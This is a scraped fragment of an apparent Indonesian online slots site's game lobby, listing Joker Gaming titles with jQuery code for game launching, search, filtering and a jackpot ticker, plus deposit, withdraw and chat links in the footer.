                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/4eaf4ebd42c454768b04f0c343a957b1.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Golden Monkey King">Golden Monkey King</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Robin Hood" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Robin Hood', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/715ae36247730e7dcfd2c0b25a74b10d.webp?v=0.1' , 'i4rc816e388c6', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/715ae36247730e7dcfd2c0b25a74b10d.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Robin Hood">Robin Hood</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Miami" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Miami', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/a7b638abd6fb620658ded93569a75139.webp?v=0.1' , 'tqi9778i7mi6o', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/a7b638abd6fb620658ded93569a75139.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Miami">Miami</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Monkey King" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Monkey King', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/189fcfa58b609ddb6fb2b55e337c18ea.webp?v=0.1' , '9upe5bm4xph81', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/189fcfa58b609ddb6fb2b55e337c18ea.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Monkey King">Monkey King</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="HighwayKings Progressive" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'HighwayKings Progressive', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/00f9f4aaafc635fc45eac7b1cee43900.webp?v=0.1' , 'nh9swadbc3use', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/00f9f4aaafc635fc45eac7b1cee43900.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="HighwayKings Progressive">HighwayKings Progressive</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mammamia" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mammamia', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/bb905f1ee040237c1550fe4c3877a10b.webp?v=0.1' , '9xpa7brfxj7zo', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/bb905f1ee040237c1550fe4c3877a10b.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mammamia">Mammamia</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Alice" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Alice', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/0325e0e074d5d58f16ca9e39f44851fc.webp?v=0.1' , 'kia1eetdryo1c', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/0325e0e074d5d58f16ca9e39f44851fc.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Alice">Alice</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="White Snake" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'White Snake', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/b4d28a97d7f969b95111726cdb02918a.webp?v=0.1' , 'u17q53q45xcp1', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/b4d28a97d7f969b95111726cdb02918a.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="White Snake">White Snake</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Captain&amp;quot;amp;s Treasure" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Captain&amp;quot;amp;s Treasure', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/b265fabf91df2ac56da924be17c905d8.webp?v=0.1' , 'bes8675wqiigs', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/b265fabf91df2ac56da924be17c905d8.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Captain's Treasure">Captain's Treasure</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Silver Bullet" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Silver Bullet', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/0052e0e324ee800af583642ea6ee9fbf.webp?v=0.1' , 'z1pc5tp4zqhm1', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/0052e0e324ee800af583642ea6ee9fbf.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Silver Bullet">Silver Bullet</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Captain&amp;quot;amp;s Treasure Pro" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Captain&amp;quot;amp;s Treasure Pro', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/f33083b1c1e7cde2f6a3c456d8bd1b01.webp?v=0.1' , 'qieoeyodyyyoc', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/f33083b1c1e7cde2f6a3c456d8bd1b01.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Captain's Treasure Pro">Captain's Treasure Pro</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Thai Paradise" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Thai Paradise', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/f2e849f3fafac8d5cc551ec3228d4006.webp?v=0.1' , '5864tji8w113w', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/f2e849f3fafac8d5cc551ec3228d4006.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Thai Paradise">Thai Paradise</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Bonus Bear" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Bonus Bear', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/c4a9ae89766269573b26998b71491799.webp?v=0.1' , 'bwwza4umpbwsh', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/c4a9ae89766269573b26998b71491799.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Bonus Bear">Bonus Bear</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Football" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Football', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/fd023666d6feea0396a22b0df9d60e71.webp?v=0.1' , 's6xhiogba5dhe', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/fd023666d6feea0396a22b0df9d60e71.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Football">Football</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Panther Moon" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Panther Moon', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/a66571c8828b373b71550afe9aaed32a.webp?v=0.1' , 'u6d7fsg355x7a', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/a66571c8828b373b71550afe9aaed32a.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Panther Moon">Panther Moon</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Dolphin Reef" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Dolphin Reef', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/373b7555007e534d692af5e859bb077c.webp?v=0.1' , 'rh8iwwntk3mie', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/373b7555007e534d692af5e859bb077c.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Dolphin Reef">Dolphin Reef</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Azteca" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Azteca', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/8d8883c08d6762c5056e5853c912fd27.webp?v=0.1' , 'oqt9p9876m39y', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/8d8883c08d6762c5056e5853c912fd27.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Azteca">Azteca</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Highway Kings" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Highway Kings', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/b5005fb47305948842eeec435800384b.webp?v=0.1' , 'axt5pxf7sk35y', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/b5005fb47305948842eeec435800384b.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Highway Kings">Highway Kings</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="A Night Out" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'A Night Out', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/b7bfc59d7da22cc23311ee0d15b79412.webp?v=0.1' , '69xaiyrbo4dae', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/b7bfc59d7da22cc23311ee0d15b79412.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="A Night Out">A Night Out</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Sparta" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Sparta', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/dc4d5291cb781ac30b0c04db8c5ebfb1.webp?v=0.1' , 'jbzd1cjsgh4dk', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/dc4d5291cb781ac30b0c04db8c5ebfb1.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Sparta">Sparta</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Genie" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Genie', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/76789d814a57eb8ee616e54c10bfea91.webp?v=0.1' , '1q36p58phmt6y', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/76789d814a57eb8ee616e54c10bfea91.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Genie">Genie</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Ocean Paradise" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Ocean Paradise', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/e8bc2b3ed08a9f2bc5baaef13869974c.webp?v=0.1' , 'kf41ymtxfos1r', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/e8bc2b3ed08a9f2bc5baaef13869974c.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Ocean Paradise">Ocean Paradise</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Three Kingdoms Quest" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Three Kingdoms Quest', 'https://www.Goblin88.site/assets/games/i/165x220/joker-gaming/379efbe5c05da3e6084b9998bad3679c.webp?v=0.1' , 'fwria11mjbrwh', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/joker-gaming/379efbe5c05da3e6084b9998bad3679c.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Three Kingdoms Quest">Three Kingdoms Quest</h5>
        </a>
        
     
  </div>

</div>

<div class="nifty-modal slide-in-bottom " id="gamelinksModal-1">
	<div class="md-content">
		<div class="md-body">
			<div class="row mb-4 no-gutters">
				<div class="col-xs-5">
					<img src="" class="img-fluid">
				</div>
				<div class="col-xs-7">
					<div class="g-title"></div>
				</div>
				<input type="hidden" value="" name="hiddenGameCode001" id="hiddenGameCode001">
				<input type="hidden" value="" name="hiddenSubGameCode001" id="hiddenSubGameCode001">

			</div>

			<div class="row  pt-2">
				<div class="col-xs-5">
									</div>
				<div class="col-xs-7   ">
					<button class="btn  btn-block btn-primary" onclick="subGameLaunch(event,0)" i18n="@PlayNow">
						MAIN SEKARANG					</button>
				</div>
			</div>
		</div>
	</div>
</div>
<div class="md-overlay"></div>
<script>
function subGameLaunch(e, isDemo) {
    // Ambil nilai dari input tersembunyi
    var provider = $('#hiddenGameID-001').val();
    var gameCode = $('#hiddenGameCode001').val();

    // Debugging: Cek di console browser (F12) apakah nilainya terbaca
    console.log("Provider:", provider);
    console.log("Game Code:", gameCode);

    if (!gameCode || gameCode === "") {
        alert("Gagal: ID Game tidak ditemukan di sistem!");
        return;
    }

    var gameData = {
    provider: $('#hiddenGameID-001').val(),
    gameCode: $('#hiddenGameCode001').val(),
    subCode: $('#hiddenSubGameCode001').val(),
    isDemo: 1  // Paksa ke mode demo
    };

    fetch('launch-game.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include',
        body: JSON.stringify(gameData)
    })
    // ... sisa kode fetch tetap sama

    .then(function(response) {
      if (!response.ok) throw new Error('Server tidak merespons dengan benar');
      return response.json();
    })
    .then(function(data) {
      if (data.success && data.launchUrl) {
        window.location.href = data.launchUrl;
      } else {
        // Tampilkan pesan error spesifik dari server (jika ada)
        console.error("Gagal meluncurkan game:", data);
        alert(data.message || "Gagal memuat game. Silakan coba lagi.");
      }
    })
    .catch(function(error) {
      console.error("Error Sistem:", error);
      alert("Koneksi ke server game terputus.");
    });
  }
</script>
<div class="nifty-modal slide-in-bottom " id="filterModal-2">
			<div class="md-content">
				<div class="md-body">
                          <div>
                            <p id="" i18n="">Select a filter : 
                                                                                </p></div>
                        <div>
                            <button class="btn btn-primary" id="btnApplyFilter_01">APPLY</button>
                        </div>
  				</div>
			</div>
</div>
<div class="md-overlay"></div>

<div class="nifty-modal slide-in-bottom " id="searchModal">
			<div class="md-content">
				<div class="md-body">
                          <div>
                            	<div class="search_filter">
											            <span class="srch_icon md-close"><i class="icon-keyboard_arrow_left"></i></span>
											            <input type="text" matinput="" placeholder="Search" [(ngmodel)]="filterInput" maxlength="255" class="search" (change)="search($event)" i18n-placeholder="@Search">
											            <button matsuffix="" class="btn srch_button" (click)="clearSearch($event)"><i class="icon-x-square"></i></button>
											        </div>
                        </div>

  				</div>
			</div>
</div>
<div class="md-overlay"></div>
<script>
         var joinedJpIds = "";
         var gameCode = "jk_slot";
       function showGameLinks(e,name,imgSrc,gameCode,subCode){

            $('#gamelinksModal-1 .g-title').text(name);
            $('#gamelinksModal-1 img').attr( 'src',imgSrc);
            $('#hiddenGameCode001').val( gameCode );
            $('#hiddenSubGameCode001').val( subCode );
            $('#gamelinksModal-1').nifty("show");
        }


          $(document).ready(function () {
              var hotGame = '';
          
              if(hotGame){ 
                  $('.game-box').each(function() {
                        var isMatch = hotGame == $(this).data('title');
                        if(isMatch){
                              $(this).trigger('click');
                              return false;
                        }
                  });
              }

              /*search*/
              $('.search').keyup(function() {
                    
                    var value = $(this).val().toLowerCase();
                    var exp = new RegExp(value);
                    $('.game-box').each(function() {
                    var isMatch = exp.test(((typeof $(this).find('h5').data('title') == 'string') ? $(this).find('h5').data('title').toLowerCase() : $(this).find('h5').data('title')));
                    $(this).toggle(isMatch);
                    });
              });
              $('.srch_button').click(function(){
                    $('.search').val("");
                    $('.search').trigger("keyup");
              });
              /*search end*/


                $('.sub-games .filter .top').addClass('active');

                  function filterGameBoxes(self){

                        $('.sub-games .filter .btn').removeClass('active');
                        $(self).addClass('active');
                        var filterType= $(self).data('filter');

                        $('.sub-games .game-box').hide();
                        $('.sub-games .game-box').filter(function(){
                        return $(this).data("filter").indexOf(filterType)>=0;
                        }).show();

                  }


                  //Default to All Games :
                  filterGameBoxes($('.sub-games .filter .btn[data-filter=ALL]')[0]);

                  //Add filter btn event listen
                  $('.sub-games .filter .btn.f').click(function(){

                               filterGameBoxes(this);
                  })

                  $('#btnApplyFilter_01').click(function(){

                         var selFilter = $('input[name="rdFilterSubGames"]:checked').val();
                          var e =  $('#btnFilters_003')[0];
                          $(e).data('filter', selFilter);
                          filterGameBoxes(e);
                          $('#filterModal-2').nifty('hide');


                  })
                

                  if(joinedJpIds){
                              var url = "https://jpn-ticker-gcp-str.hep200512.com/v1/ticker?currency="+window.currencyCode +"&jackpotIds=" + joinedJpIds; 
           
                              
                              if($.ajaxSettings && $.ajaxSettings.headers) {
                                    delete $.ajaxSettings.headers["X-CSRF-TOKEN"];
                                    // console.log("remove X-CSRF-TOKEN header");
                                    // alert("remove X-CSRF-TOKEN header");
                              }
                              $.ajax({
                                          url: url,
                                          type: 'GET', 
                                          dataType: 'json', 
                                          headers: {
                                   
                                          },
                                          beforeSend: function(jqXHR, settings) {
                                                          
                                            }
                              })
                              .done(function(data) {
                                    if(data && data.length>0 ){
                                                //console.log(data);
                                          for (let i = 0; i < data.length; i++) {
                                                var  jp  = data[i];
                                                if(jp.jackpotId && jp.pools ){
                                                      var pool = jp.pools;
                                                      for(var key in pool ){ 
                                                                  if(pool.hasOwnProperty(key)){
                                                                        var amt = pool[key].amount;
                                                                       
                                                                        if(amt > 0 ){
                                                                              // console.log(amt);
                                                                               
                                                                              amt = amt.toString()
                                                                              $('[data-jpid="'+ jp.jackpotId +'"]').find('.amount_box').text( window.currencyCode +' ' +window.formatNumber(amt)).show();

                                                                              $('[data-jpid="'+ jp.jackpotId +'"]').find('.amount_box').each(function () {
                                                                              $(this).prop('Counter', 0).animate({
                                                                                    Counter: amt
                                                                              }, {
                                                                                    duration: 7000,
                                                                                    step: function (func) {
                                                                                    $(this).text(window.currencyCode +' ' +window.formatNumber(func.toString()));
                                                                                    }
                                                                              });
                                                                              });
                                                                        }
                                                                  }
                                                              break;
                                                      }
                                                }
                                                   
                                          }

                                                
                                      }
                                                
                                  
                                   
                              }) ;
                              if($.ajaxSettings && $.ajaxSettings.headers) {
                              
                                    $.ajaxSettings.headers["X-CSRF-TOKEN"] = $('meta[name="csrf-token"]').attr('content'); 
                                    // console.log("add back X-CSRF-TOKEN  header");
                                    // alert("add back X-CSRF-TOKEN header");
                              }
                 }

          });
</script>

                    <div class="mobilesite-footer">  
          <div class="container">
              <style media="screen">
.left-custom-livechat-code{
  bottom: 58px !important;
}
#chat-widget-container{
  bottom: 51px !important;
}
</style>
<div class="menu-bottom">
    <nav class="navbar-inverse navbar-fixed-bottom">
        <div class=" ">
                        <div class="flex-row  text-center">
                <div class="  footericon-single">
                    <a href="https://www.Goblin88.site/home.php?i=1#"><i class="icon-home"></i><div>HOME</div></a>
                </div>
                

                                
                                  <div class="  footericon-single">
                    <a href="https://www.Goblin88.site/promosaya.php"><i class="icon-gift"></i> <div style="text-transform:uppercase;">Promo saya</div></a>
                  </div>
                
                <div class=" footericon-single">
                    <a href="javascript:void(0);" class="text-uppercase togglemenu-trigger footer-funds" data-showid="#fundshover_menu"><i class="icon-transfer"></i> <div>Dana</div></a>
                    <ul class="list-inline horizontal-hover togglemenu-content" id="fundshover_menu">
                      <li>
                        <a href="https://www.Goblin88.site/deposit.php" (click)="closeNav($event);">
                            <div class="fs-sm mt-1" i18n="">Deposit</div>
                        </a>
                      </li>
                      <li>
                        <a href="https://www.Goblin88.site/withdraw.php" (click)="closeNav($event);">
                          <div class="fs-sm mt-1" i18n="">Withdraw</div>
                        </a>
                      </li>
                      <li>
                        <a href="https://www.Goblin88.site/history.php" (click)="closeNav($event);">
                          <div class="fs-sm mt-1" i18n="@History">Pernyataan &nbsp;</div>
                        </a>
                      </li>
                    </ul>
                </div>
                                                <div class=" footericon-single">
                    <a href="https://www.Goblin88.site/memo.php" style="position:relative;"><i class="icon-mail_outline"></i> <div>MEMO</div>
                      
                            <div class="mail_icon" style="">26</div>
                        
                    </a>
                </div>
                
<div class=" footericon-single" style="position: relative">
    <a href="javascript:void(0)" class="text-uppercase togglemenu-trigger" data-showid="#livechathover_menu"><i class="icon-chat1"></i><div>LIVE CHAT</div></a>
    <ul class="list-inline vertical-hover togglemenu-content text-center" id="livechathover_menu">
        <li>
            <!-- 👇 Link statis diganti pakai variabel PHP $linkLiveChat, dan script JS dihapus -->
            <a href="javascript:void(0)" id="livechat-btn" onclick="openLiveChat('https://direct.lc.chat/19926541/' , '')">
                <i class="icon-chat1"></i>
            </a>
        </li>
                                                              
        <li>
            <a href="https://api.whatsapp.com/send?phone=081318111340" target="_blank "><i class="icon-whatsapp"></i></a>
        </li>                          
                                                   
        <li>
            <a href="https://telegram.me/BABYBOSSQOFFICIAL" target="_blank "><i class="icon-telegram"></i></a>
        </li>
    </ul>
</div>
            </div>
        </div>
    </nav>
</div>



<script type="text/javascript">
    $(".togglemenu-trigger").click(function(){
      var currentToggle = $(this).attr("data-showID");
      if($(currentToggle).hasClass("show")){
        $(currentToggle).removeClass("show");
      }
      else{
        $(".togglemenu-content").removeClass("show");
        $(currentToggle).addClass("show");
      }

    });
</script>
            </div>
            </div>
                  </div>
      </div>
      <div id="r-side-bar"> 
    <div class="side-bar-content container"> 
            </div> 
</div> 
 



    </div>
  </div>


  <!--loading modal -->
  <div class="nifty-modal fade-in-scale" id="loading--layout" style="z-index:1000001;" data-isnotcloseoverlay="true">
    <div class="md-content">
      <div class="md-body">

        <div class="loader-b large"></div>
      </div>
    </div>
  </div>
  <div class="md-overlay" style="z-index:1000000;"></div>
  <!--END loading modal -->

  <!-- APK download ||Transfer Wallet  modal start-->
  <div class="nifty-modal slide-in-bottom downloadapk-modal" id="apk-modal">
  			<div class="md-content">
          <div class="modal-header">
       <button class="pull-right md-close"><i class="icon-x fs-lg"></i></button>
      <h3 id="downloadgame-title"></h3>
    </div>
  				<div class="md-body">
           <!--region Transfer Wallet Menu -->
            <div class="row no-gutters" id="trans_to_game_menu__game-modal">
                <form action="" method="post" id="tw_transfer_form" class="tw_transfer_form" novalidate="novalidate">
                  <input type="hidden" name="_token" value="6mpScfAoG0WWOBdqpvKSa5nHR7C4udBoqhKvvRL6">                    <div class="form-group">
                        <label for="mainwallet_amount">From Main Wallet</label>
                        <input type="text" class="form-control" readonly="" name="mainwallet_amount" id="mainwallet_amount" value="188.67">

                    </div>
                    <div class="text-center">
                      <span class="vertical"><i class="icon-arrow-long-right"></i></span>
                    </div>
                    <div class="row">
                      <div class="col-xs-12">
                        <label for="mainwallet_amount">Transfer to <span id="gamename"></span> Wallet</label>
                        <div class="form-group">

                          <div class="customrange-slider">
                            <div id="slider" overflow-scroll="false" class="ui-slider ui-corner-all ui-slider-horizontal ui-widget ui-widget-content">
                              <span tabindex="0" class="ui-slider-handle ui-corner-all ui-state-default" style="left: 0%;"></span>
                              <div class="ui-slider-range ui-corner-all ui-widget-header ui-slider-range-min" style="width: 0%;"></div>
                            </div>
                            <div class="decrease-btn cusbtn">
                              <div id="tw_decrease_btn"> <span class="minus-icon custom-icon">-</span> </div>

                              <div class="minmax-label">Min</div>
                              <div class="minmax-value">
                              5000
                              </div>
                              <input type="hidden" name="twminval" id="twminval" value="5000">
                            </div>
                            <div class="increase-btn cusbtn">
                              <div id="tw_increase_btn">
                                <span class="plus-icon custom-icon">+</span>
                              </div>

                              <div class="minmax-label">Max</div>
                              <div class="minmax-value" id="maxSliderApk">188.67</div>
                            </div>
                          </div>
                        </div>
                          <div class="col-md-8 col-md-offset-2 col-sm-8 col-sm-offset-2 col-xs-8 col-xs-offset-2">
                        <div class="form-group">
                            <input type="text" readonly="" class="form-control" name="transfer_amount" id="transfer_amount" placeholder="0.00" value="00.00" required="">
                        </div>
                        </div>
                      </div>
                    </div>
                    <div class="text-center">
                        <input type="submit" class="btn btn-primary" value="SUBMIT">
                    </div>
                </form>
            </div>
          <!--endregion Transfer Wallet Menu -->

  					<div class="row no-gutters">
  							<div class="col-xs-12 text-center">
  								<a href="#" id="launchurl" class="url-link" target="_blank">
                	<img class="img-fluid" src="/assets/images/log_html5.png" alt="play-in-browser">
  								<div class="download-caption text-center">
  										Play now in your browser
  								</div>
  								<div class="download-linkbtn text-center">
  									<img class="img-fluid" src="/assets/images/btn_playnow.png" alt="play-now-in-browser">
  								</div>
  							</a>
  							</div>
  						</div>
    				</div>
  			</div>
  </div>
  <div class="modal-wrapper nifty-modal fade-in-scale" id="live-draw-modal" data-isnotcloseoverlay="true">
    <div class="md-content"> 
      <div class="md-body"> 
        <div class="modal-header">
        <h4 class="modal-title">Live Draw</h4>      
        <button class="btn btn-link pull-left " id="btn-close--live-draw-modal"> <i class="icon icon-close"></i> </button>
</div>

<div class="modal-body">
    <div id="live_draw_table">
   
    </div>
    <div id="img_details">
        <img src="" class="draw_img" id="draw_img">
        <div class="details">

            <p class="tickte_id">undian berikutnya: <span id="ticket_id"></span></p>
        </div>

        <div class="close_btn_section">
            <button class="btn btn-close" id="img--section-closebtn" onclick="closeImageSection()">Kembali</button>
        </div>
    </div>
    
</div>
      </div>
    </div>
  </div>
  <div class="md-overlay"></div>
  <!-- APK download modal end-->


  <!--<script src="/js/sweetalert.js"></script>  -->


  <script type="text/javascript">

    $(document).ready(function(){
        $( "#mainContentContainer" ).click(function() {
